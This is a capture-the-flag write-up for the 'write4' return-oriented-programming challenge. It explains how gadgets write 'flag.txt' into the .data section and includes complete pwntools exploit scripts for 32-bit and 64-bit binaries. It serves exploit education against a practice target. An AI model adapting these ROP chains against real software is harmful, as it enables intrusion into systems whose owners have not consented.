# Solution
To solve this challenge, we must answer these questions first,
> 1. How do we write a string into memory?
2. Where do we write it?
3. How do we use the string as parameter?

## Train of thought
Let's do some recon. Maybe the information we find might help us.
![[write4-img1.png]]
`usefulFunctions` turns out to be a junk since the usual `"\bin\cat flag"` string is replaced with the string `"nonexistent"`. But `usefulGadget` looks interesting.
![[write4-img2.png]]
VOILA!
`xchg ax,ax` is basically just `NOP` but `mov DWORD PTR [edi],ebp` is interesting. This means that whatever in `ebp` we can copy to an address contained in `edi`. Meaning, we can put the string `"flag.txt"` to `[edi]`. 

But wait, registers can only hold 4 bytes of value so we can't store our string in any of them (even if it can, in the case of 64 bit, we wouldn't be able to do that, [[write4#^3b9b11 | see here]] ), our string is 8 bytes. Moreover, we need a gadget that can `pop` values from the stack to register `ebp` and `edi`, so we can use the `mov` instruction.
![[write4-img3.png]]
We found the gadget. That was lucky.

We can use [[Cheat Sheet#^ebd814 | readlef]] to find a place to write our string into. You can also you [[Cheat Sheet#^c3e87f | rabin2 -S]] if you only want to show the section header.
![[write4-img4.png]]
Perfect! `.data` can store 8 bytes of data, has a write permission and the address doesn't contain null bytes.

---
## Answers
Now, we have all the answers to our questions.
### 1. How do we write a string into memory?
We can utilize the `pop edi; pop ebp` gadget to store whatever value we want on the stack to register `edi` and `ebp` then use the `mov DWORD PTR [edi],ebp` gadget to transfer `ebp`'s value to memory location of `edi`. 

#### 2.  Where do we write our string or What value should be of `edi`?
`edi` should be the address of `.data` segment.

### 3.  How do we use the string as parameter?
Remember [[Return-to-libc attack#^77982f | ret2libc]]? We can change the the value of `addr of param` to the address of `.data` segment.

---
## Payload
### 32bit
```python
from pwn import *

gadget1 = p32(0x08048543) # mov DWORD PTR [edi],ebp; ret;
gadget2 = p32(0x080485aa) # pop edi; pop ebp; ret;

print_file_addr = p32(0xf7fc074f)
data_addr1 = p32(0x0804a018)   # we need to write it two times since 
data_addr2 = p32(0x0804a018+4) # we can only write 4 bytes at a time
exit_addr = p32(0xf7df3680) 

payload = b"A"*44 + gadget2 + data_addr1 + b"flag" + gadget1
payload += gadget2 + data_addr2 + b".txt" + gadget1
payload += print_file_addr + exit_addr + data_addr1

p = process("./write432")
p.recvuntil(b">")
p.send(payload)

print(p.recvall().decode())
```

### 64bit
For 64 bit, the payload is more shorter since the register can already hold 8 bytes thus we only need to store the string once into `.data` segment.
```python
from pwn import *

gadget1 = p64(0x0000000000400628) # mov QWORD PTR [r14],r15; ret;
gadget2 = p64(0x0000000000400690) # pop r14; pop r15; ret;
gadget3 = p64(0x0000000000400693) # pop rdi; ret; -> to set up parameter

print_file_addr = p64(0x7ffff7dc3943)
data_addr1 = p64(0x00601028)

# put "flag.txt" to .data segment
payload = b"A"*40 + gadget2 + data_addr1 + b"flag.txt" + gadget1 
# put .data segment addr to register rdi
payload += gadget3 + data_addr1 + print_file_addr 

#print(payload, end="")
p = process("./write4")
p.recvuntil(b">")
p.send(payload)

print(p.recvall().decode())
```

#### But if the register can already hold our string, why do we need to store it somewhere else in the first place? 
Because the function takes the **ADDRESS** of the string thus we need to store the string somewhere else and reference it by putting its address into the register. 
So, if we directly put the string of `"flag.txt"` into the register, instead of using that string, it will instead go to address `0x666c61672e747874` (the hex of `"flag.txt"`) and grab whatever value in that address. ^3b9b11

---
## Resource
* [28479-return-oriented-programming-(rop-ftw).pdf (exploit-db.com)](https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf)